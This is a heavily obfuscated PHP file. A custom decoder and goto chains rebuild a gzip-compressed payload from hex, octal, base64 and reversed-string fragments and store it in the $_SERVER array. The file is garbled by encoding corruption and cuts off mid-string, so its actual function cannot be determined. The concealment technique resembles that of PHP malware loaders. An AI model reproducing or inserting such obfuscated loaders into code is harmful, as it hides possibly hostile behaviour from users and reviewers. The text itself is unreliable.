<?php
 goto aŒæ∑ˆ’Èõ; aŒæ∑ˆ’Èõ: if (!function_exists('_kodDe')) { function _kodDe($AÑá§õﬂ≈) { $AÑá§õﬂ≈ = base64_decode($AÑá§õﬂ≈); $A™ËéçáË‰ = strlen($AÑá§õﬂ≈); $EöÑ∑æ‰è± = ''; $AÉõ»ô¢‘≈ = ord($AÑá§õﬂ≈[0]) - 30; for ($E ∫≠¡æïê = 1; $E ∫≠¡æïê < $A™ËéçáË‰; $E ∫≠¡æïê += 2) { if ($E ∫≠¡æïê + 1 < $A™ËéçáË‰) { $EöÑ∑æ‰è± .= chr(ord($AÑá§õﬂ≈[$E ∫≠¡æïê + 1]) + $AÉõ»ô¢‘≈); $EöÑ∑æ‰è± .= chr(ord($AÑá§õﬂ≈[$E ∫≠¡æïê]) + $AÉõ»ô¢‘≈); } else { $EöÑ∑æ‰è± .= chr(ord($AÑá§õﬂ≈[$E ∫≠¡æïê]) + $AÉõ»ô¢‘≈); } } return $EöÑ∑æ‰è±; } } define("\260\343\367\304\204\274\273", "\xcf\xec\xc0\xec\xf4\xda"); $_SERVER[∞„˜ƒÑºª] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\x9d\x7d\x9\x80\x13\x45\xd6\xb0\x7\x2b\x8a\xba\xba\xea\xba\xee\x22\xda\xe\xc7\x1c\xe4\x18\xe\x11\x7\x86\x21\x93\x64\x66\x22\xb9\x48".base64_decode('Mgw4GUJP0jPTTJIO3Z05OPwUEC9A+VC8UFlvRUE8UHDV9VhcTzxWVtcDUQ4=')."\161\5\135\135\327\133\376\272\253\72\311\370\177\337\347\61\251\172\165\277\252\172\365\336\253\127\257\77\377\327\113\57\157\170\377\365\133\26\36\276\360\210\205\107".base64_decode('vv/Ck9etv2rd9y/jKPh3EAih8JlXHH0Y+ufkzKrp056tPvH5Vd/tvuvSzx8=')._kodDe('KtSwY3wzasBr7tobtZJv8q0RsctH7xBjtvOThtjyT+NxevGv54I3auPdqrOj')."\x7f\xdf\xe3\x7\x37\xcc\xfe\xeb\xad\xbf\xb3\x79\xf6\x96\xbd\xfe\xe8\xa4\xdf\x2d\x4d\x94\x1f\x37\xe6\xd5\xe4\xc9\x23\xdf\xbe\xf2\x9d\xda\x9f\xaf\xae\x3e\x43\x3f\x23\xb3\xec\x88"."\xf2\x2f\xcf\x88\xfe\xeb\xd1\xb7\xae\xff\xbc\xcd\xf3\xbe\xf3\xea\xd7\x2e\xf9\x74\x58\xd5\x89\xa3\x27\x3f\xf6\xf2\x77\x33\x7e\x5d\x3d\xf2\xbc\x25\xb\xae\x7c\xef\xaa\x9f\x3e\xbf"."\xe7\x96\x7b\x57\x5c\xb0\x61\x7d\xe4\xda\xb7\xce\x77\xee\x9c\xd1\xfd\xce\xa1\xe7\xec\x23\xef\xbb\x71\x8d\x7d\xd1\xf1\x1b\xe7\xf\x3a\x6a\xe3\x9a\xe4\x5b\xc7\xdf\xfe\xe1\x33\xd9"."\xbb\x9f\x7b\xe1\xf7\xa7\x3a\x2e\xbb\xc9\xb5\x6b\xf0\xf2\x63\x8e\xaf\x3e\xff\x32\xe5\x89\x93\xb7\x6c\xf9\x5b\xe6\x8d\xb3\x86\x77\x4f\x3e\x6d\xf9\x67\x15\x9f\x1c\xb5\xf8\xa7\x9b"."\267\337\261\366\347\354\152\317\361\255\373\376\365\315\71\103\272\256\237\174\321\260\175\25\53\377\61\354\137\223\147\137\174\362\31\225\147\264\176\173\370\141\207\141".strrev(',Hﬁ√á6àñ(`â√Ç¶´KÃc¸Nø≈ö∞‚v°€-IÅ¶ß“íô´)‡‘')."\x41\x6a\x14\xd3\x33\x5a\x8a\x84\x72\xb2\x2e\x67\x48\xe5\x39\x45\x37\x40\x53\x62\x75\x89\x9c\x96\x53\xb2\x16\x8\x7\xa4\x64\x53\x6e\x97\xd\x52\x93\xa7\x3e\xe1\xf1\x86\xfd\xa1".base64_decode('WYnYrLCX5GhPzMsrej+OoWDUlHUzpmYUlqNXZ/2q9zb6glIs4gpGXe6YLxQ=')."\304\140\167\50\20\360\305\212\341\221\220\337\137\357\162\117\53\116\11\107\134\215\1\227\4\372\227\126\22\152\266\103\253\220\346\340\224\71\122\45\16\64\250\112"."\72\205\203\131\231\166\307\354\317\221\120\214\205\300\34\144\363\351\64\216\4\131\210\364\137\351\220\363\151\202\63\217\30\311\351\152\106\246\103\237\246\364\63\50"."\xe\xc8\x79\x53\x53\xb3\x49\x1c\xf1\xf6\x99\xba\xcc\xe1\xa0\xc7\x49\x5d\xc9\x28\x59\x52\x55\xd4\xeb\xf7\xba\x63\x12\xec\xa6\xd4\x10\x9\x5\x24\x32\x15\x19\xd9\x30\x15\x5d\x6a"."\x69\xf2\x46\xbc\x12\xec\x7a\x6d\x39\x1a\x71\xb9\x84\xcb\x35\x7\x1\x42\x24\x97\xdf\x2f\xd\x54\x83\xa9\x64\x72\xb4\x1a\x5c\xa6\x44\x65\xa1\x88\xc7\x1b\x91\xea\x67\x49\x1c\x4f"."\x49\x2d\x93\xd1\xb2\xe\x50\xb\x98\x4f\x53\xe8\xaa\x37\x12\xc1\x1\x1b\x59\xc1\x7e\x1f\x9c\x3a\x12\x9\x35\x34\x44\xbd\x2c\x46\xd6\xaa\xdc\xa1\xa6\x95\xa8\x3a\x5f\xf1\x65\xb"."\x21\x38\xe\x63\x89\x4e\xc5\x4c\x80\xd5\x6f\x82\x96\xc8\x72\x95\x73\x39\x27\xc4\x56\x5a\x93\x53\x8e\x5c\x57\xe\x43\x87\xe0\x9f\x31\xd5\xf8\x37\x9f\x4d\xab\xd9\x6e\xb1\x5e\x82"."\322\351\176\60\376\161\144\157\130\142\251\216\264\231\350\221\323\171\272\105\110\361\162\362\103\176\65\203\364\143\236\232\125\363\144\213\220\52\64\315\240\33\315\140".base64_decode('O5cEFBrIskygAo3saTDEHhysnYJ/J5FM7XD4PYpuJpRsUkupWUIG6sjgyMI=')."\227\315\56\217\256\202\174\244\102\315\221\324\162\375\1\255\107\100\246\237\355\362\16\55\235\122\164\36\317\201\342\142\12\31\226\145\52\202\371\214\230\205\105\223"."\135\152\72\245\123\342\360\113\71\15\305\64\101\377\15\332\305\346\34\234\303\250\242\263\156\347\21\244\101\323\63\36\100\144\10\6\300\326\122\233\113\44\164\323".base64_decode('zZUSBu4gxLGi9SL7z22tU8GfSkIp46QXXUo6nVD6FLIJM6mzDdpDp9GuZp0=').base64_decode('AIKjvlCiSza6AqmzE6gUJcAppY+vPE4kyO6AyAxqpleg3x6blJIC0iypqUY=').base64_decode('rWFrJKV29HOSWEZIkdJnkg5Lk5Jdsg6wVps3O+wT2fJPq0nZVLWsU0uaimk=').base64_decode('N0xdkckAyiZJcAbgjq3Cpei6deNNZI/pctboUHS7lyynGgmMmVEsms2jGjk=')."\xcd\x50\x61\x33\x35\x92\x6c\x9a\x72\xb2\xb\xee\x76\x5e\x7d\xed\x2f\xe4\x57\xe1\xee\x53\x6\xcc\xb\x69\x6c\x8d\x44\x49\x60\x4e\xd5\x15\x83\x46\xa5\xc6\x40\x8c\x64\x6\x2d\x2a"."\366\260\56\167\146\344\32\51\227\157\7\243\46\153\275\4\14\347\206\15\350\132\272\106\112\302\250\115\312\344\15\323\256\53\140\123\253\340\320\42\170\366\165\330"."\3\20\365\252\222\262\107\1\305\45\340\161\325\343\45\60\153\22\115\303\320\246\130\54\234\360\65\200\203\65\350\115\4\134\61\167\23\351\266\51\167\322\76\373"."\x1\x1d\x65\x55\x52\xe0\x4c\x7b\x28\x6f\x36\xc0\xcd\x0\xc6\xcf\x81\x61\xad\x57\xd1\x41\xc3\xf5\xfd\x35\x52\xb7\x96\x6a\xd7\xfa\x1c\x34\xa9\x81\x10\x3f\x9a\xd9\x95\x4c\x2a\x39"."\323\36\221\263\235\20\77\355\375\246\102\126\116\132\113\312\151\161\303\340\160\227\151\346\242\112\66\325\300\250\135\112\353\315\242\55\226\123\350\200\242\336\310\14".strrev('”M64π8∞<“îAŒFˆìI/0)(èm7lÌl’;g^r\\Zƒ5'."\r".'$o')."\xfc\xbe\x46\x88\x35\x8f\xdd\x0\x99\xec\x62\x2e\x5a\xb7\x5f\xcd\xa8\x70\x60\x26\x4b\x41\x68\x6\x87\x79\x23\xe9\x90\x13\x8d\xb6\x36\xde\x55\x55\x11\x4f\x8d\xae\xb4\x83\xbf\x55"."\x95\xad\x71\x8f\xa3\xaa\xad\xce\xa9\xf2\x32\xce\x31\x8e\x31\xd2\xd8\xea\x9\x52\x18\x70\x17\xaa\x9c\x96\xc8\x12\x2b\xca\x51\x2d\x85\xa6\x59\x17\xa1\x5f\xc9\x76\x9a\x5d\x84\xe1"."\212\170\247\67\173\243\261\104\300\33\153\12\171\110\151\257\313\303\107\127\343\164\362\210\301\142\176\15\157\105\72\20\160\366\167\52\111\160\66\351\162\32\116\23"."\135\164\140\123\343\100\247\332\301\11\245\17\160\50\244\126\114\146\170\44\252\146\162\164\32\315\256\174\246\135\10\72\171\15\204\244\201\251\241\144\244\113\143\104".base64_decode('XdNJiHV35NgGStmc0XHgP07GUlpGpqylC/S9V0mFdLWTgqosKU2KzE8JU4c=')."\x87\x71\x2f\x8d\x93\x2c\x1\xc5\xec\xd2\xc8\xa2\x3\x87\x38\xe9\x52\x9e\xf5\x8d\xf6\x32\xa5\xa4\x15\x8a\xa5\x2e\x85\xae\x65\xc0\x2f\xf5\x30\xe4\xe5\x74\xa5\x43\x25\xeb\x13\x30"."\x48\x0\xce\xa9\xa6\x6a\x44\x40\x21\xc8\xb0\xd0\x78\xb\xe4\x2b\x39\xc0\x64\x59\x1\x5a\xdd\xf0\xac\x6a\x10\x8e\x38\x6\x63\xb8\x6c\x68\xf6\xfb\x13\xee\x50\x30\x6\xb8\x4c\xc"."\151\211\370\142\136\272\116\134\236\204\313\35\146\47\7\237\60\222\1\356\326\142\152\207\41\75\143\5\22\337\145\146\310\36\346\324\225\236\57\220\172\342\60\40"."\x8d\x39\x2d\x6b\x28\x76\xc2\x3\xd9\x53\x9c\xce\x12\x3e\xa1\x80\xc8\x16\x95\xe0\xbc\x6d\x9f\x5d\xce\xcc\xb7\x67\x14\x53\xb6\xb3\xae\xcf\xcd\x11\x7e\x22\x47\x19\x8b\xb9\x39\x85"."\x84\xda\x33\x39\x61\x55\x73\xc6\xac\x57\x4d\x51\x76\xa1\x4b\x51\x3b\xbb\x28\x1b\x6c\x39\xe4\xa4\x98\x48\xa1\x7c\x64\x5e\x39\x19\x4e\x83\xd3\x11\x48\x21\xf4\x84\xc\x87\xa2\xa4"."\100\35\204\2\236\241\135\321\311\220\302\315\44\51\43\254\251\106\157\214\236\347\362\30\262\362\132\242\224\166\346\101\106\135\235\57\163\74\325\321\216\220\112\373"."\x32\x69\xce\xff\xc4\x9a\x7c\xc1\x69\x89\x40\xc8\xe3\xf5\x27\x7c\x41\x40\x23\x63\xc5\xf0\xe6\xb0\xc7\x45\xd7\x81\x8\xaf\xf\xc5\x9a\x2c\xd0\x66\x40\x48\x66\xb8\xfc\xbe\xc2\xec"."\336\231\276\150\54\132\62\11\300\232\275\5\51\100\260\12\107\274\15\276\231\54\332\340\363\372\75\321\204\333\345\156\342\171\202\256\0\211\44\72\240\150\143\70"."\255\371\23\200\334\107\231\200\224\350\201\302\236\306\70\156\121\32\111\120\216\67\301\227\14\70\326\24\262\114\311\160\241\210\211\106\102\70\317\244\226\247\13\227"."\261\121\31\112\65\62\62\331\266\162\17\131\123\25\370\247\122\162\105\45\63\227\140\364\241\275\237\5\321\60\150\34\234\164\244\175\211\120\347\242\36\44\140\236"."\x7a\xa5\x43\xd3\x95\x5f\x2\xb8\x3a\x4c\xba\xeb\xb\xe3\x60\xb\xf1\x34\x30\x3\x2e\x24\xcb\x82\x95\x80\x66\x24\x41\xb7\xa5\x1\xb8\x70\x17\xed\x4e\x7\x97\x23\x13\x21\x20\x70"."\273\240\24\232\150\211\204\202\215\244\100\157\227\102\73\340\43\350\257\240\154\16\21\106\115\116\247\0\217\42\163\316\220\42\175\256\106\121\271\20\377\214\42\133"."\x13\x30\xa1\xe4\x64\xc9\x52\xac\xb7\x43\x6a\xcd\x68\x8\xe5\xf4\xc1\xa2\xa7\x94\x56\xcb\xb3\xd6\xda\x35\x2d\x4d\xf7\x21\x38\x8c\x19\xe9\x60\x62\xec\x5c\x83\x2e\x92\x3e\x4a\xa7".base64_decode('RtOjjFCFWGiaN5igKwvHhNWIAUAwDEUIQkytm4oJODHijdJdrCvz8ipFl9M=').base64_decode('MZqsYgUcSqR55+x47+iKVvtoRxsIVFZNxVESizss0RGkfF5npeHBXWHUVdY=')."\304\235\161\147\105\135\115\253\313\76\137\266\317\257\266\237\153\157\33\35\167\124\216\46\200\266\5\143\155\343\27\301\14\40\143\335\360\66\360\123\33\257\33\31".base64_decode('t4+6YM7U1nhbec3os+KO4fHetqrKOtpOMq8DESjZz7qaGl0BugR4F5Yli0g=')."\x9a\x90\x81\x26\xcc\x57\x73\x1c\xba\x60\xc2\x22\xa\x7\x73\xa8\x74\xf2\x12\xad\xf6\xf8\xe8\xb6\x3a\xa1\x9c\x0\x2a\x6c\xb\xf0\x36\x80\xbe\x76\xb1\x7c\x2e\xfb\xf9\x70\x64\xac"."\50\334\367\144\175\344\263\111\116\44\341\276\150\227\223\204\16\250\235\131\266\205\300\51\317\104\117\53\77\275\140\44\376\135\104\47\262\123\241\147\65\324\132\351"."\144\165\346\263\352\74\52\132\147\225\171\44\240\231\164\175\267\53\146\257\102\227\7\200\133\342\140\161\120\216\27\44\11\261\64\342\342\110\13\134\110\122\220\124".strrev(''."\n".'ôÎDq¶%aJ	Ω˚’s"aTJsîë∑$1”ÃñJR≈ó¨^@KëFA')."\x8d\x53\x54\x26\xc\x72\x7e\x39\x21\x22\x2f\x27\x53\x6\x1\x8a\x8b\xec\xd0\x2f\xd6\x68\xc0\x73\x9d\x4b\xe0\xce\x8a\x78\x3c\xdf\xaa\xa4\xda\x5a\xc1\x82\x95\xed\x1d\x6d\xb\xc6"."\55\252\244\254\260\63\16\376\241\21\114\247\110\317\162\174\236\14\300\150\45\115\166\76\26\151\233\22\214\322\301\56\62\241\135\323\31\263\4\341\234\145\65\65"."\123\116\263\154\60\55\6\41\224\252\320\243\25\262\33\202\316\15\121\274\40\123\50\11\372\26\46\316\133\141\66\41\212\377\326\22\111\331\347\261\223\351\160\315"."\264\373\10\257\316\2\152\212\16\233\121\267\14\323\206\134\162\377\363\373\157\331\373\365\223\77\276\217\343\77\221\372\217\4\177\7\341\60\127\106\137\334\334\266"."\xf2\xe4\x31\xc7\xad\xb9\xf0\xda\x3d\xa7\x2c\xda\xf5\x2b\xef\xc5\xa3\xa5\x7b\xeb\xef\xb8\xdc\xfb\xfe\x11\x27\x1c\xdd\xfc\xce\xca\x77\x1b\x2\xe5\xb7\x8d\xb0\xb7\x3e\x3c\xf8\xc3".base64_decode('w05fPDQ3/LGjXph4We2bs/rUn85deejLd95sOvaRWwIHz9xZt/W/Fj/16uk=')."\x7\xfe\xf0\x60\xf0\xad\x6f\x77\x36\x3d\xe5\x7e\xe1\x96\xa1\x4d\x9d\xd9\xb9\xe6\xaf\x4e\x7d\x7d\xd9\x4b\xe7\x95\xf\x75\x1e\x38\xf5\xc7\x7\xdf\xbb\x68\x52\x68\xd4\xed\x1b\xf6"."\x1c\xee\x59\x7e\xd6\xad\xb\x7e\x73\xdf\xd2\xe8\xce\xa9\xf7\xd9\x9b\x4e\x98\xf6\xdb\xe0\x9\x77\x46\x6e\x34\x46\x1f\xbc\x7d\xc1\x13\xd1\xad\xcf\x7c\x31\x68\xc9\x34\xd7\xe1\xab"."\47\336\170\364\236\121\353\236\136\262\356\374\121\57\236\175\376\315\356\227\337\276\350\334\265\123\257\210\367\107\66\377\56\172\364\313\37\57\71\266\154\357\353\227".base64_decode('f3naSVMuvPah+ckvv67Y+/PCB19c8qfj1cpHD5v1yEc7bkh+NeWSOUc/1DQ=')."\xe4\xbc\x4d\x15\xa7\x6e\xbb\x7d\xef\x1d\x87\x8d\x99\xe2\x3b\xf3\x8e\x29\x77\xf6\x44\xde\x3d\x31\xfa\xf9\xb7\xfd\xf7\x5d\x74\xcb\xc9\x2b\x9f\x68\xbc\xe7\x96\x33\xe6\xde\xb6\x27"."\166\363\104\371\147\357\31\367\307\317\213\67\277\177\350\333\203\213\324\113\347\36\32\175\351\374\320\61\216\75\377\131\166\307\336\75\23\366\135\374\351\257\356\333"."\336\335\366\330\362\123\176\137\177\361\357\354\323\56\71\172\202\377\312\147\156\276\253\245\345\372\203\317\335\377\353\257\316\330\135\163\215\361\176\237\62\323\255\55"."\377\72\372\253\255\237\336\273\41\163\375\63\311\325\177\335\265\243\42\266\267\133\17\273\166\154\132\150\74\62\354\251\337\70\234\15\27\234\62\354\366\143\207\117"."\71\364\325\227\177\333\324\136\377\342\175\17\254\130\77\321\371\304\223\7\167\331\202\317\175\160\330\364\71\133\47\53\67\355\13\154\334\162\354\115\266\375\312\214"."\x6d\xfb\x1c\xff\x71\xdc\x70\x62\xaa\x63\x68\xff\xfc\x96\xeb\xfe\xbe\xe5\xd9\x6f\x3f\xfa\xf1\xdc\xaf\x96\x5e\xd1\x76\xd7\xd1\xe5\x27\x5c\xf4\xe8\x1b\x7\x8e\xfa\xa3\x6e\x34\x7f"."\176\311\356\315\17\334\361\373\245\373\57\376\347\324\313\126\375\255\346\11\327\333\113\275\163\206\236\224\137\277\156\367\165\33\3\35\323\117\14\276\260\376\301\344"."\x87\x1b\x5e\xdf\xb6\x78\x58\xe3\xbd\x4f\x5c\xb6\xe0\xa2\x8d\xdf\x8e\xfd\x6a\xe5\x8e\x53\x5a\x2f\xdc\x53\x9d\x71\x3d\xf7\xf2\xb4\x37\x77\x8e\xb9\xe9\xec\x17\x32\x63\x3f\x75\xbe"."\170\363\346\301\225\353\137\235\170\333\247\177\371\313\45\147\355\177\363\351\227\146\17\376\323\230\357\147\374\143\323\361\301\312\123\17\154\257\253\273\340\347\237\177"."\xfe\xe7\xb8\xc5\xce\x9f\xa2\xfe\x39\xb\xa7\x6f\x9a\xf1\xc3\xd5\x57\xf6\xed\xd8\x74\xfa\xf9\x8d\x1f\xef\x2b\xb\xbe\x7d\xdd\xe6\x91\x3b\x9f\xfd\x31\x79\xfa\xb5\x2f\x25\xbc\xdf"."\xfe\x66\xd5\xfe\xc1\xf4\x36\x0\x30\xc2\x60\x77\xfa\x95\x1e\xca\xd\x18\x5a\x5e\x4f\x2a\x6c\x85\x1b\xa2\x24\x33\x86\x53\xd\xc0\x44\xea\xba\xdc\x2f\x96\x1\xd2\x98\xc\x80\x22"."\250\11\112\231\164\163\250\132\2\103\23\160\277\142\130\24\1\274\75\214\102\340\272\305\104\104\10\35\130\46\23\31\56\334\163\232\327\126\252\277\134\251\14\253".base64_decode('5UJScYxWw4mhKeuAT+S5SsdpOWsMd7bZoP3Aajget3a9aApUwyMIrByTOE4=')."\xb4\xcf\x58\xaa\xcc\x2a\xf4\x80\x80\x63\xd\xab\xd9\x7e\x7a\xd6\xf1\xb8\x28\xe6\x83\xb3\x92\xdd\xc2\x90\x89\xb6\xc1\x9c\x36\x3e\x3c\x1b\x1d\x8b\x8d\xf\xc3\x46\xf1\x6a\xa3\xa8"."\xb3\xd1\x31\xd8\x84\xee\xdb\x30\x2a\x6d\x1c\x8b\x69\xb5\x9b\x84\x6c\x23\x4b\xd\xe\x13\x4c\x3c\xd1\xe2\xa4\x43\xe1\x8a\x1d\xb3\xa5\x16\x66\x9e\x21\x53\x35\xa2\x5d\xa0\xb\x31"."\x72\x64\xa0\x8\x29\x1\x83\x6c\x66\x61\x24\xc1\x58\x12\xd4\xd1\x8\x6a\x5d\x58\xc8\x96\x15\xa7\xe5\xfa\xf1\xa0\x1b\x74\x2d\xe3\xb\x39\xc\x78\xbd\xf4\x3f\xc8\xa7\x50\xb6\x19"."\66\202\64\264\305\205\344\24\122\7\14\124\47\115\146\125\161\335\201\234\313\105\362\144\216\163\351\74\123\236\340\60\113\12\13\111\216\166\141\333\70\144\56\223"."\100\206\100\247\45\232\43\176\70\33\164\146\140\124\313\263\254\124\173\325\34\361\21\176\200\251\250\51\253\210\271\206\371\200\17\214\73\23\155\125\4\34\240\272".strrev('d˘\'Œ,J¢b™VÎÖ®§åÎ–2'."\n".'7ô≤õåÈÊ¿z–2Y∆d¿<‹ª{*.')."\122\241\167\45\251\166\216\112\270\114\5\176\2\106\243\142\336\144\326\24\222\101\314\222\12\225\76\160\306\171\214\55\101\200\125\306\201\141\201\307\1\173\350\260"."\xe\xa8\x7a\x8c\x25\x47\xaa\xdd\x92\xce\xa0\x74\x9d\x14\xa6\x74\x14\xc2\xdb\x11\xea\x1c\x14\x3\xed\x2\x26\xe5\x14\x10\x97\x1d\xa6\x6c\x74\x3b\x44\xb0\x5d\x4c\x5\x3c\x1d\x18"."\x6b\xda\x61\xbd\x7a\xe5\x9d\xe3\x2\x7b\xa6\xdf\x98\x97\x2e\x4a\xe6\x98\xc2\x4d\x24\x8a\x46\x27\x62\x8f\xd0\x7f\x49\x36\x92\xec\x74\xe0\xca\x46\x55\xe3\x84\x96\x4a\xf3\xf8\x67"."\216\215\136\266\126\112\110\243\21\225\310\265\234\215\374\36\217\177\342\144\341\306\311\362\56\267\221\113\12\117\275\160\213\234\113\221\71\253\141\211\236\50\131\223"."\4\41\116\210\20\272\306\113\315\115\321\310\341\140\371\130\10\222\53\40\204\14\2\337\220\72\212\261\210\347\132\304\223\245\23\10\361\274\130\247\131\214\55\322".base64_decode('A948uTDiAHH5WFe4ZWFZ9wYh7Oia1ibhBm0SvIWySdYrPJ+Hz6m41nQll5Y=').strrev('ûk¿"K 8Z-ñ8`ªƒÁqM\\‘¬∆¶I¥\'©"l£2›à©~πS¨ì').strrev('FâXuëZdù*c¥ËëµI îVjï)+¶LòöÇçÍ¶Q≈®‚ºHE%1˘j')."\325\324\223\353\0\15\205\226\30\346\244\72\162\57\233\20\32\44\141\56\263\211\320\264\226\354\266\124\6\1\102\232\244\350\272\246\117\202\304\251\226\103\311\132"."\26\362\72\70\270\227\250\140\72\110\163\1\353\160\100\67\354\154\204\240\327\200\6\247\14\144\113\102\126\352\131\4\273\302\215\153\204\43\7\26\107\270\372\205"."\xa2\xa6\x38\xa0\x1c\xa0\xf3\x59\x26\x53\xca\x8c\x2d\x30\xd2\x32\x15\xb4\xc\x70\xc\x0\x46\x88\x21\x38\x6f\xb0\x53\xeb\x6c\x36\x7\x89\x94\x4a\xd5\xf1\xa6\x99\x4b\x24\xd3\x9a"."\x21\x2c\xda\x44\x2e\x5f\x68\x2\x20\x9a\xc3\xd4\x8\x14\xf\xde\x7d\x70\xbe\x12\xc6\xf8\x1d\x8\x64\x4a\x78\x5a\x4e\x36\x8c\x5e\x20\xda\x92\xe5\xe2\x8d\x49\x50\x73\x15\x95\x38"."\35\162\67\271\42\114\73\165\266\243\332\61\206\347\5\15\46\240\222\256\226\136\256\106\143\256\110\11\103\25\154\300\102\20\115\214\126\110\201\246\120\213\344\16"."\xf9\x9b\x3\xc1\x28\xb6\xcc\xc0\xf0\x60\x48\x48\x47\x3a\x8\x4b\xb2\x8\x26\xd5\x7a\xc3\x7e\x97\xdb\x2b\xf9\x82\xb1\x10\x55\x2e\x32\x1d\x2b\x21\xc2\x56\x2a\x9d\x83\x57\xca\xcc"."\60\205\224\307\21\121\365\55\326\310\152\42\253\263\325\126\36\57\213\127\305\53\342\225\163\34\161\243\215\220\336\71\302\21\244\212\263\103\42\141\17\31\135\15"."\13\245\14\262\111\3\321\350\164\162\337\22\212\270\334\176\332\243\172\127\224\4\103\156\302\335\354\273\172\323\356\255\53\367\335\270\141\317\145\53\100\105\173\157"."\130\274\367\332\315\273\37\133\361\311\222\47\366\154\130\276\357\311\225\173\257\336\270\167\371\105\144\30\237\154\174\164\367\23\117\355\273\372\356\75\33\256\333\273".base64_decode('Zsu+G5bihP33bNpz+d2sY9L+1U/uXXnH3mse2Ltiw56tq/f8afGexx6zgdI=')."\xfb\x2f\x5e\xb1\xef\x89\xd\x7b\x2f\x5d\xb3\xf7\xb6\xb\xf7\x3e\x72\xc5\xde\xb5\x2b\xf6\x5c\xfe\xc7\x3d\xd7\xdf\xbd\x6f\xe5\xc6\x3d\xb7\x2e\xd9\xb3\x6c\xc5\x27\x1b\xaf\x39\xab"."\160\35\341\170\53\235\221\66\202\270\331\161\243\252\2\143\71\156\214\206\30\256\4\277\25\120\145\11\176\251\6\7\254\276\50\144\351\202\156\157\341\25\200\30"."\45\306\75\125\170\201\300\365\235\60\224\171\171\45\13\350\50\61\16\242\361\4\272\40\52\37\260\27\13\311\62\20\72\45\164\306\343\215\272\43\276\172\57\121"."\212\261\211\32\211\224\71\104\166\0\320\150\144\6\13\263\53\263\42\223\54\251\202\163\11\226\201\310\200\135\117\347\63\131\324\131\251\14\52\211\312\154\360\154"."\x45\xf7\x11\x52\x19\xa4\xf6\x0\xa0\x24\xc1\xce\xab\x80\x56\x17\xb0\x4a\x5b\xf9\xac\x72\x5b\xb5\x6d\x4c\xa5\x44\xec\xb5\x70\x9\x62\x9f\x25\x95\x11\xdb\x2c\x56\xce\xd2\x88\xad".strrev('V ci)+Pe‘√\'û]ÿ∞È[dê”ú	˜†Ø_§e›r îÆ´c›')."\374\132\154\256\222\16\136\2\317\23\310\121\10\223\134\101\217\65\47\66\325\12\227\113\162\66\5\122\60\176\305\151\56\257\224\332\45\164\7\41\225\110\104\305"."\54\310\250\265\40\243\142\64\41\27\341\106\66\337\130\203\50\341\153\46\334\55\331\240\23\105\240\150\252\40\24\317\26\315\253\201\141\200\311\301\371\101\200\245"."\164\53\375\274\46\100\225\130\2\235\101\10\147\223\130\42\15\331\320\225\141\106\5\217\63\143\164\122\212\107\214\250\2\263\330\30\350\132\46\123\240\160\13\74"."\x78\x61\xe6\x8d\xb9\x9b\xf0\x2a\x8f\xa\xcb\x3c\xd5\x3e\xd2\xb2\x50\x39\x3a\x25\xcb\x12\x49\x53\x3\xd\x92\xf\x6f\x17\x48\x10\x8e\x41\xf9\x7c\xc1\x86\x50\x24\x80\x2f\x8a\xa2"."\356\46\157\300\345\40\264\34\257\4\234\37\62\300\122\255\124\16\51\37\6\225\133\320\217\32\242\50\213\241\126\301\276\112\230\212\141\142\54\344\72\111\147\310"."\xec\x4b\xc8\x3c\x40\x46\x45\x6a\xcb\xb1\xd5\xc\xa9\x92\x19\x8c\x86\x22\xb1\x4\x40\x0\x21\xcf\x2\xd5\x2d\x17\xe\x8d\x19\x5c\x13\xb\xef\x3b\x7a\x98\x70\x86\x59\x66\xce\xa7".base64_decode('yKM5Q6OkCHHskJNA9qImW+3U+hR0AbbsDgUbfPTmzNNuSfNEfNBmhXROojU=').strrev('bn-¿ß%(ﬂ¥:¡.`â;ÄŒ'."\0".'å	Äà70±MÎí ï¬ î◊')."\227\326\60\41\24\21\42\256\210\53\20\145\321\110\13\240\350\20\46\134\356\6\134\321\30\30\125\260\71\300\251\276\337\65\3\54\230\20\347\121\50\305\256\160"."\124\325\125\306\361\325\25\16\342\237\251\64\6\5\374\266\5\143\154\322\204\105\225\44\17\275\354\111\230\135\152\226\162\223\260\225\351\376\204\77\324\210\343\310"."\70\327\233\115\161\336\131\152\225\42\371\54\214\23\356\336\240\307\27\333\21\22\130\307\22\276\17\227\202\241\26\27\267\364\24\22\60\204\260\266\22\267\377\164"."\316\156\215\367\306\35\200\175\60\346\360\33\51\117\275\104\31\23\167\227\102\271\143\152\17\355\242\47\52\75\72\250\244\231\110\153\235\324\6\14\220\110\312\100"."\xe0\xdf\x99\x34\x80\xa8\x27\x29\x0\x64\xae\x5c\x9a\xde\x50\xe1\xab\xb1\x44\x7c\x61\x7c\x54\xdc\xee\xc0\xb7\x81\x90\xab\x89\xdb\x78\xcf\x12\xde\x99\xe0\xd4\x8d\x46\x2d\x57\x99".base64_decode('CWSVSGoHYyYhvI9xZDL5IXLDZIIJEp1Sy6bWO31hEPzfGFvoBf/7wY8/BiY=')."\x4f\x65\x19\xc0\x26\xf5\xfb\xa6\x79\x17\xc2\x3f\x3c\xa1\x52\x12\x33\xf8\x82\xb\xc1\x5f\x40\x62\x16\xfa\x82\x85\x85\xeb\xbd\xb1\x16\xaf\x17\x67\xa0\x61\xf2\xcb\xb3\x2\x92\x43"."\x86\x26\x98\x6e\x9f\x17\xa2\x37\xd7\x92\xdf\xdb\x10\x93\x60\x9c\x36\x9b\x48\x54\x20\xe4\xd9\xdb\x46\x57\x26\x12\x4e\xa3\x99\xac\x16\x66\xe\x54\x51\x3e\x62\x4c\x39\x39\x45\x5c"."\x51\x37\xa7\xbf\x96\x75\x50\xbc\x4\x42\xf0\xc6\xc9\x3a\xff\xcc\x14\x99\xc4\x1b\x23\xa1\xe6\xb0\x10\x6f\x72\xcd\xf0\x5\x1b\x69\xcc\x59\x45\x43\x54\xd1\x25\x79\x7c\x51\x80\x22".strrev('¢'."\n".'G$fZ—¸˚7’èu≥iÄ4° `DA€@